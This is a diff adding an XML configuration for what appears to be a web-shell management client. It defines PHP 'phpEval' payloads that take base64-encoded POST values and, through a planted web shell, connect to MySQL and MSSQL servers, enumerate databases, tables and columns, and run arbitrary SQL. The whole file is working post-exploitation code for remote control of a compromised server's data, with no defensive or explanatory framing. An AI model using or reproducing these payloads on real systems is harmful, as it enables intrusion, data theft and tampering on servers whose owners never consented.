@@ -1,0 +1,290 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <funcCodeSetting>
+    <func>
+      <name>ConnectDb</name>
+	  <type>phpEval</type>
+	  <path>/DbManager/mysql</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+      <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
+list($host,$user,$pwd,$lan)=explode(";",$C);
+$T=@mysql_connect($host,$user,$pwd);
+print($T?"1":"0");
+@mysql_close($T);]]></item>
+    </func>
+    <func>
+      <name>GetDbName</name>
+	  <type>phpEval</type>
+	  <path>/DbManager/mysql</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+      <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
+list($host,$user,$pwd,$lan)=explode(";",$C);
+$T=@mysql_connect($host,$user,$pwd);
+$q=@mysql_query("SHOW DATABASES");
+while($rs=@mysql_fetch_row($q))
+{
+	print(trim($rs[0]).chr(9));
+}
+@mysql_close($T);]]></item>
+    </func>
+	<func>
+      <name>GetTableName</name>
+	  <type>phpEval</type>
+	  <path>/DbManager/mysql</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+      <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
+$db=base64_decode($_POST["$dbName$"]);
+list($host,$user,$pwd,$lan)=explode(";",$C);
+$T=@mysql_connect($host,$user,$pwd);
+$q=@mysql_query("SHOW TABLES FROM `{$db}`");
+while($rs=@mysql_fetch_row($q))
+{
+	print(trim($rs[0]).chr(9));
+}
+@mysql_close($T);]]></item>
+    </func>
+	<func>
+      <name>GetColumnType</name>
+	  <type>phpEval</type>
+	  <path>/DbManager/mysql</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >columnName</funcParam>
+      <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
+$db=base64_decode($_POST["$dbName$"]);
+$col=base64_decode($_POST["$columnName$"]);
+list($host,$user,$pwd,$lan)=explode(";",$C);
+$T=@mysql_connect($host,$user,$pwd);@mysql_select_db($db);
+$q=@mysql_query("SHOW COLUMNS FROM `{$col}`");
+while($rs=@mysql_fetch_row($q))
+{
+	print(trim($rs[0])." (".$rs[1].")".chr(9));
+}
+@mysql_close($T);]]></item>
+    </func>
+	<func>
+      <name>ExecuteReader</name>
+	  <type>phpEval</type>
+	  <path>/DbManager/mysql</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >sqlStr</funcParam>
+      <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
+$db=base64_decode($_POST["$dbName$"]);
+$sql=base64_decode($_POST["$sqlStr$"]);
+list($host,$user,$pwd,$lan)=explode(";",$C);
+$T=@mysql_connect($host,$user,$pwd);
+@mysql_query("SET NAMES utf8");
+@mysql_select_db($db);
+$q=@mysql_query($sql);
+$i=0;
+while($col=@mysql_field_name($q,$i))
+{
+	print($col."\t|\t");$i++;
+}
+print("\r\n");
+while($rs=@mysql_fetch_row($q))
+{
+	for($c=0;$c<$i;$c++)
+	{
+		print(trim($rs[$c]));
+		print("\t|\t");
+	}
+	print("\r\n");
+}
+@mysql_close($T);]]></item>
+    </func>
+	<func>
+      <name>ExecuteNonQuery</name>
+	  <type>phpEval</type>
+	  <path>/DbManager/mysql</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >sqlStr</funcParam>
+      <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
+$db=base64_decode($_POST["$dbName$"]);
+$sql=base64_decode($_POST["$sqlStr$"]);
+list($host,$user,$pwd,$lan)=explode(";",$C);
+$T=@mysql_connect($host,$user,$pwd);
+@mysql_query("SET NAMES utf8");
+@mysql_select_db($db);
+$q=@mysql_query($sql);
+print("Result\t|\t\r\n");
+print($q?"Execute Successfully!":mysql_error());
+print("\t|\t\r\n");
+@mysql_close($T);]]></item>
+    </func>
+	
+	<func>
+      <name>ConnectDb</name>
+	  <type>phpEval</type>
+	  <path>/DbManager/mssql_sqlsrv</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+      <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
+list($host,$user,$pwd,$lan)=explode(";",$C);
+$connInfo = array("UID"=>$user,"PWD"=>$pwd);
+$conn = sqlsrv_connect($host,$connInfo);
+$err=sqlsrv_errors();
+if($conn){
+	print("1");
+	sqlsrv_close($conn);
+}else{
+	print("ERROR://".$err[0]['message']);
+}]]></item>
+    </func>
+	<func>
+      <name>GetDbName</name>
+	  <type>phpEval</type>
+	  <path>/DbManager/mssql_sqlsrv</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+      <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
+list($host,$user,$pwd,$lan)=explode(";",$C);
+$connInfo=array("UID"=>$user,"PWD"=>$pwd);
+$sql="SELECT name FROM Master..SysDatabases ORDER BY 1;";
+$conn=sqlsrv_connect($host,$connInfo);
+$err=sqlsrv_errors();
+if(!$conn){
+	print("ERROR://".$err[0]['message']);
+}else{
+	$q=sqlsrv_query($conn,$sql);
+	if($q){
+		while($rs=sqlsrv_fetch_array($q))
+		{print(trim($rs[0]).chr(9));}
+	}else{
+		$err=sqlsrv_errors();
+		print("ERROR://".$err[0]['message']);
+	}
+	sqlsrv_close($conn);
+}]]></item>
+    </func>
+	<func>
+      <name>GetTableName</name>
+	  <type>phpEval</type>
+	  <path>/DbManager/mssql_sqlsrv</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+      <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
+$db=base64_decode($_POST["$dbName$"]);
+list($host,$user,$pwd,$lan)=explode(";",$C);
+$connInfo=array("UID"=>$user,"PWD"=>$pwd,"Database"=>$db);
+$sql="SELECT name FROM sysobjects WHERE (xtype='U') ORDER BY 1;";
+$conn=sqlsrv_connect($host,$connInfo);
+$err=sqlsrv_errors();
+if(!$conn){
+	print("ERROR://".$err[0]['message']);
+}else{
+	$q=sqlsrv_query($conn,$sql);
+	if($q){
+		while($rs=sqlsrv_fetch_array($q))
+		{print(trim($rs[0]).chr(9));}
+	}else{
+		$err=sqlsrv_errors();
+		print("ERROR://".$err[0]['message']);
+	}
+	sqlsrv_close($conn);
+}]]></item>
+    </func>
+	<func>
+      <name>GetColumnType</name>
+	  <type>phpEval</type>
+	  <path>/DbManager/mssql_sqlsrv</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >columnName</funcParam>
+      <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
+$db=base64_decode($_POST["$dbName$"]);
+$col=base64_decode($_POST["$columnName$"]);
+list($host,$user,$pwd,$lan)=explode(";",$C);
+$connInfo=array("UID"=>$user,"PWD"=>$pwd,"Database"=>$db);
+$sql="SELECT A.[name],B.[name] FROM syscolumns A,systypes B where A.id=object_id('{$col}') and A.xtype=B.xtype ORDER BY A.colid;";
+$conn=sqlsrv_connect($host,$connInfo);
+$err=sqlsrv_errors();
+if(!$conn){
+	print("ERROR://".$err[0]['message']);
+}else{
+	$q=sqlsrv_query($conn,$sql);
+	if($q){
+		while($rs=sqlsrv_fetch_array($q))
+		{print(trim($rs[0])." (".$rs[1].")".chr(9));}
+	}else{
+		$err=sqlsrv_errors();
+		print("ERROR://".$err[0]['message']);
+	}
+	sqlsrv_close($conn);
+}]]></item>
+    </func>
+	<func>
+      <name>ExecuteReader</name>
+	  <type>phpEval</type>
+	  <path>/DbManager/mssql_sqlsrv</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >sqlStr</funcParam>
+      <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
+$db=base64_decode($_POST["$dbName$"]);
+$sql=base64_decode($_POST["$sqlStr$"]);
+list($host,$user,$pwd,$lan)=explode(";",$C);
+$connInfo=array("UID"=>$user,"PWD"=>$pwd,"Database"=>$db);
+$conn=sqlsrv_connect($host,$connInfo);
+$err=sqlsrv_errors();
+if(!$conn){
+	print("ERROR://".$err[0]['message']);
+}else{
+	$q=sqlsrv_query($conn,$sql);
+	if($q){
+		foreach(sqlsrv_field_metadata($q) as $field)
+		{
+			print("$field[Name]\t|\t");
+		}
+		print("\r\n");
+		while($rs=sqlsrv_fetch_array($q,SQLSRV_FETCH_ASSOC))
+		{
+			foreach($rs as $value)
+			{
+				print((($value instanceof DateTime)?$value->format('Y-m-d H:i:s'):trim($value))."\t|\t");
+			}
+			print("\r\n");
+		}
+	}else{
+		$err=sqlsrv_errors();
+		print("ERROR://".$err[0]['message']);
+	}
+	sqlsrv_close($conn);
+}]]></item>
+    </func>
+	<func>
+      <name>ExecuteNonQuery</name>
+	  <type>phpEval</type>
+	  <path>/DbManager/mssql_sqlsrv</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >sqlStr</funcParam>
+      <item><![CDATA[$C=base64_decode($_POST["$connStr$"]);
+$db=base64_decode($_POST["$dbName$"]);
+$sql=base64_decode($_POST["$sqlStr$"]);
+list($host,$user,$pwd,$lan)=explode(";",$C);
+$connInfo=array("UID"=>$user,"PWD"=>$pwd,"Database"=>$db);
+$conn=sqlsrv_connect($host,$connInfo);
+$err=sqlsrv_errors();
+if(!$conn){
+	print("ERROR://".$err[0]['message']);
+}else{
+	$q=sqlsrv_query($conn,$sql);
+	if($q){
+		$affected = sqlsrv_rows_affected($q);
+		if(!$affected){
+			print("ERROR://".$err[0]['message']);
+		}
+		else{
+			print("Result\r\n".$affected." rows affected");
+		}
+	}else{
+		$err=sqlsrv_errors();
+		print("ERROR://".$err[0]['message']);
+	}
+	sqlsrv_close($conn);
+}]]></item>
+    </func>
+  </funcCodeSetting>
+</customShellType>
